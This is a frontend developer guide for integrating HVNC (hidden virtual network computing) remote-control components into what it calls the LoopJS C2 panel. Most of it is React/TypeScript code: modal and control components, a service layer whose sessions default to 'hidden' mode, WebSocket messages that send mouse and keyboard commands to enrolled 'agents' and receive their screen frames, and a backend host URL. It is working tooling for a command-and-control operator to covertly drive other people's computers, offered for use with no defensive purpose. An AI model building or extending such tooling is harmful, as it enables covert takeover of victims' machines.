# HVNC UI Development Guide

## Overview

This guide provides detailed instructions for frontend developers to integrate and build the HVNC (Hidden Virtual Network Computing) remote control UI components into the LoopJS C2 panel.

## Table of Contents

1. [Component Architecture](#component-architecture)
2. [Installation & Setup](#installation--setup)
3. [Component Integration](#component-integration)
4. [Usage Examples](#usage-examples)
5. [API Reference](#api-reference)
6. [WebSocket Events](#websocket-events)
7. [Styling & Theming](#styling--theming)
8. [Best Practices](#best-practices)
9. [Troubleshooting](#troubleshooting)

---

## Component Architecture

### Core Components

1. **HvncModal** (`frontend/src/components/HvncModal.tsx`)
   - Modal wrapper component
   - Handles overlay and close functionality
   - Contains the HvncControl component

2. **HvncControl** (`frontend/src/components/HvncControl.tsx`)
   - Main HVNC control interface
   - Handles WebSocket communication
   - Manages mouse/keyboard input
   - Displays remote screen canvas

3. **HvncContext** (`frontend/src/contexts/HvncContext.tsx`)
   - React context for HVNC state management
   - Provides session management functions
   - Shared state across components

4. **hvncService** (`frontend/src/services/hvncService.ts`)
   - API service layer
   - Handles HTTP requests to backend
   - Type-safe service methods

### Component Hierarchy

```
HvncModal (Modal Wrapper)
  └── HvncControl (Main Control Interface)
      ├── Canvas (Screen Display)
      ├── Mouse Handlers
      ├── Keyboard Handlers
      └── Control Buttons
```

---

## Installation & Setup

### Prerequisites

- React 18+
- TypeScript
- Tailwind CSS (for styling)
- React Icons (`react-icons/fi`, `react-icons/si`)
- Axios (for API calls)

### Dependencies

All required dependencies should already be installed. If not, install:

```bash
npm install react-icons axios
```

### Configuration

Ensure your `frontend/src/config.ts` is properly configured:

```typescript
export const API_URL = `${BACKEND_URL}/api`;
export const WS_URL = import.meta.env.VITE_WS_URL || 
  (isLocal ? 'ws://localhost:8080/ws' : 'wss://loopjs-backend-s3ja.onrender.com/ws');
```

---

## Component Integration

### Step 1: Add HVNC Button to Client Details

Update `ClientDetails.tsx` to include an HVNC button:

```typescript
import React, { useState } from 'react';
import HvncModal from '../../components/HvncModal';

const ClientDetails: React.FC<ClientDetailsProps> = ({ client, onCommandSent }) => {
  const [isHvncOpen, setIsHvncOpen] = useState(false);

  return (
    <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
      {/* Existing client details */}
      
      {/* Add HVNC Button */}
      <div className="mt-4 flex gap-2">
        {client.features?.hvnc && (
          <button
            onClick={() => setIsHvncOpen(true)}
            className="px-4 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors flex items-center gap-2"
          >
            <FiMonitor className="w-4 h-4" />
            Remote Control (HVNC)
          </button>
        )}
      </div>

      {/* HVNC Modal */}
      {client.id && (
        <HvncModal
          agentId={client.id}
          platform={getClientOS()}
          isOpen={isHvncOpen}
          onClose={() => setIsHvncOpen(false)}
        />
      )}
    </div>
  );
};
```

### Step 2: Add HVNC Button to Agent List/Table

If you have an agent list component, add HVNC action buttons:

```typescript
import HvncModal from '../components/HvncModal';

const AgentList: React.FC = () => {
  const [selectedAgent, setSelectedAgent] = useState<{id: string, platform: string} | null>(null);
  const [isHvncOpen, setIsHvncOpen] = useState(false);

  const handleHvncClick = (agent: Agent) => {
    if (agent.features?.hvnc) {
      setSelectedAgent({ id: agent.id, platform: agent.platform });
      setIsHvncOpen(true);
    }
  };

  return (
    <>
      {/* Agent list/table */}
      <table>
        {/* ... */}
        <td>
          {agent.features?.hvnc && (
            <button
              onClick={() => handleHvncClick(agent)}
              className="px-3 py-1 bg-primary text-white rounded hover:bg-primary/90"
            >
              <FiMonitor className="w-4 h-4 inline mr-1" />
              HVNC
            </button>
          )}
        </td>
      </table>

      {/* HVNC Modal */}
      {selectedAgent && (
        <HvncModal
          agentId={selectedAgent.id}
          platform={selectedAgent.platform}
          isOpen={isHvncOpen}
          onClose={() => {
            setIsHvncOpen(false);
            setSelectedAgent(null);
          }}
        />
      )}
    </>
  );
};
```

### Step 3: Using HvncContext (Optional)

For advanced state management across multiple components:

```typescript
import { HvncProvider, useHvnc } from '../contexts/HvncContext';

// Wrap your component tree
<HvncProvider agentId={client.id}>
  <YourComponent />
</HvncProvider>

// Use in child components
const YourComponent = () => {
  const { session, startSession, stopSession } = useHvnc();
  
  // Use session state and functions
};
```

---

## Usage Examples

### Basic Integration

```typescript
import React, { useState } from 'react';
import HvncModal from '../components/HvncModal';

const MyComponent: React.FC = () => {
  const [isOpen, setIsOpen] = useState(false);
  const agentId = 'agent-uuid-here';
  const platform = 'windows'; // or 'mac', 'linux', 'android'

  return (
    <>
      <button onClick={() => setIsOpen(true)}>
        Open HVNC
      </button>
      
      <HvncModal
        agentId={agentId}
        platform={platform}
        isOpen={isOpen}
        onClose={() => setIsOpen(false)}
      />
    </>
  );
};
```

### Custom Styling

```typescript
// Override modal styles
<HvncModal
  agentId={agentId}
  platform={platform}
  isOpen={isOpen}
  onClose={() => setIsOpen(false)}
  className="custom-modal-class" // Add custom class if needed
/>
```

### With Context Provider

```typescript
import { HvncProvider } from '../contexts/HvncContext';

const App: React.FC = () => {
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);

  return (
    <HvncProvider agentId={selectedAgent || ''}>
      {/* Your app components */}
    </HvncProvider>
  );
};
```

---

## API Reference

### HvncModal Props

| Prop | Type | Required | Description |
|------|------|----------|-------------|
| `agentId` | `string` | Yes | UUID of the agent/client |
| `platform` | `string` | Yes | Platform type: 'windows', 'mac', 'linux', 'android' |
| `isOpen` | `boolean` | Yes | Controls modal visibility |
| `onClose` | `() => void` | Yes | Callback when modal is closed |

### HvncControl Props

| Prop | Type | Required | Description |
|------|------|----------|-------------|
| `agentId` | `string` | Yes | UUID of the agent/client |
| `platform` | `string` | Yes | Platform type |
| `onClose` | `() => void` | Yes | Close callback |

### HvncContext Methods

```typescript
interface HvncContextType {
  session: HvncSession;
  startSession: (agentId: string, quality: string, fps: number) => Promise<void>;
  stopSession: (agentId: string) => Promise<void>;
  sendCommand: (agentId: string, command: string, params: any) => Promise<void>;
  takeScreenshot: (agentId: string) => Promise<void>;
  updateSessionStatus: (status: HvncSession['status'], error?: string) => void;
  updateScreenInfo: (screenInfo: HvncSession['screenInfo']) => void;
}
```

### hvncService Methods

```typescript
// Start session
await hvncService.startSession(agentId, {
  quality: 'medium', // 'high' | 'medium' | 'low'
  mode: 'hidden'      // 'hidden' | 'visible' | 'shared'
});

// Stop session
await hvncService.stopSession(agentId, sessionId);

// Get status
await hvncService.getSessionStatus(agentId, sessionId);

// Send command (mouse/keyboard)
await hvncService.sendCommand(agentId, sessionId, {
  command: 'mouse_move',
  params: { x: 100, y: 200 }
});

// Take screenshot
await hvncService.takeScreenshot(agentId, sessionId);
```

---

## WebSocket Events

### Outgoing Messages (Client → Server)

#### Authentication
```typescript
{
  type: 'auth',
  token: 'jwt-token-here'
}
```

#### Web Client Identification
```typescript
{
  type: 'web_client'
}
```

#### HVNC Command
```typescript
{
  type: 'hvnc_command',
  targetId: 'agent-uuid',
  sessionId: 'session-id',
  command: 'mouse_move',
  params: { x: 100, y: 200 }
}
```

### Incoming Messages (Server → Client)

#### HVNC Response
```typescript
{
  type: 'hvnc_response',
  agentUuid: 'agent-uuid',
  sessionId: 'session-id',
  status: 'connected' | 'disconnected' | 'error',
  screenInfo?: { width: number, height: number },
  error?: string
}
```

#### HVNC Frame
```typescript
{
  type: 'hvnc_frame',
  agentUuid: 'agent-uuid',
  sessionId: 'session-id',
  frameData: 'base64-encoded-jpeg',
  frameInfo: {
    width: number,
    height: number,
    size: number
  }
}
```

---

## Styling & Theming

### Tailwind CSS Classes

The components use Tailwind CSS with dark mode support. Key classes:

- `bg-white dark:bg-boxdark` - Background colors
- `text-black dark:text-white` - Text colors
- `border-stroke dark:border-strokedark` - Border colors
- `bg-primary`, `bg-success`, `bg-danger` - Status colors

### Custom Styling

To customize styles, modify the component files or add custom CSS:

```css
/* Custom HVNC canvas styles */
.hvnc-canvas {
  border: 2px solid #your-color;
  border-radius: 8px;
}

/* Custom modal overlay */
.hvnc-modal-overlay {
  background: rgba(0, 0, 0, 0.8);
}
```

### Platform Icons

Icons are automatically selected based on platform:
- Windows: `SiWindows`
- macOS: `SiApple`
- Linux: `SiLinux`
- Android: `SiAndroid`

---

## Best Practices

### 1. Error Handling

Always wrap HVNC operations in try-catch:

```typescript
try {
  await hvncService.startSession(agentId, { quality: 'medium', mode: 'hidden' });
} catch (error) {
  console.error('HVNC start failed:', error);
  toast.error('Failed to start HVNC session');
}
```

### 2. Connection State Management

Monitor connection state and provide user feedback:

```typescript
const [connectionStatus, setConnectionStatus] = useState<'disconnected' | 'connecting' | 'connected'>('disconnected');

// Update based on WebSocket events
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  if (data.type === 'hvnc_response') {
    setConnectionStatus(data.status === 'connected' ? 'connected' : 'disconnected');
  }
};
```

### 3. Cleanup on Unmount

Always clean up WebSocket connections:

```typescript
useEffect(() => {
  const ws = new WebSocket(WS_URL);
  
  return () => {
    ws.close();
  };
}, []);
```

### 4. Performance Optimization

- Use `useCallback` for event handlers
- Debounce mouse move events if needed
- Limit frame rate updates
- Use `React.memo` for expensive components

### 5. Accessibility

- Add ARIA labels to buttons
- Provide keyboard navigation
- Show loading states
- Display error messages clearly

---

## Troubleshooting

### Issue: WebSocket Connection Fails

**Solution:**
1. Check `WS_URL` in `config.ts`
2. Verify JWT token is valid
3. Check browser console for errors
4. Ensure backend WebSocket server is running

### Issue: Canvas Not Displaying Frames

**Solution:**
1. Check WebSocket message format
2. Verify `frameData` is base64 encoded
3. Check canvas dimensions match screen info
4. Inspect browser console for image loading errors

### Issue: Mouse/Keyboard Input Not Working

**Solution:**
1. Verify session is active (`isConnected === true`)
2. Check WebSocket connection is open
3. Verify command format matches expected structure
4. Check browser console for command errors

### Issue: Modal Not Opening

**Solution:**
1. Verify `isOpen` prop is `true`
2. Check `agentId` is valid
3. Ensure component is rendered in DOM
4. Check for z-index conflicts

### Issue: Authentication Errors

**Solution:**
1. Verify JWT token exists in localStorage
2. Check token expiration
3. Ensure token is sent in WebSocket auth message
4. Verify backend authentication middleware

---

## Complete Integration Example

```typescript
import React, { useState } from 'react';
import HvncModal from '../components/HvncModal';
import { FiMonitor } from 'react-icons/fi';

interface Agent {
  id: string;
  name: string;
  platform: string;
  features: {
    hvnc: boolean;
  };
}

const AgentCard: React.FC<{ agent: Agent }> = ({ agent }) => {
  const [isHvncOpen, setIsHvncOpen] = useState(false);

  return (
    <div className="bg-white dark:bg-boxdark rounded-lg p-4 shadow-sm">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="font-semibold">{agent.name}</h3>
          <p className="text-sm text-gray-500">{agent.platform}</p>
        </div>
        
        {agent.features.hvnc && (
          <button
            onClick={() => setIsHvncOpen(true)}
            className="px-4 py-2 bg-primary text-white rounded-lg hover:bg-primary/90 transition-colors flex items-center gap-2"
            aria-label="Open HVNC Remote Control"
          >
            <FiMonitor className="w-4 h-4" />
            Remote Control
          </button>
        )}
      </div>

      {isHvncOpen && (
        <HvncModal
          agentId={agent.id}
          platform={agent.platform}
          isOpen={isHvncOpen}
          onClose={() => setIsHvncOpen(false)}
        />
      )}
    </div>
  );
};

export default AgentCard;
```

---

## Additional Resources

- **Backend API Docs**: See `backend/controllers/agent.controller.js`
- **WebSocket Handler**: See `backend/configs/ws.handler.js`
- **Component Source**: `frontend/src/components/HvncControl.tsx`
- **Service Layer**: `frontend/src/services/hvncService.ts`

---

## Support

For issues or questions:
1. Check browser console for errors
2. Verify WebSocket connection in Network tab
3. Review backend logs for server-side errors
4. Check component props are correctly passed

---

**Last Updated**: 2024
**Version**: 1.0.0
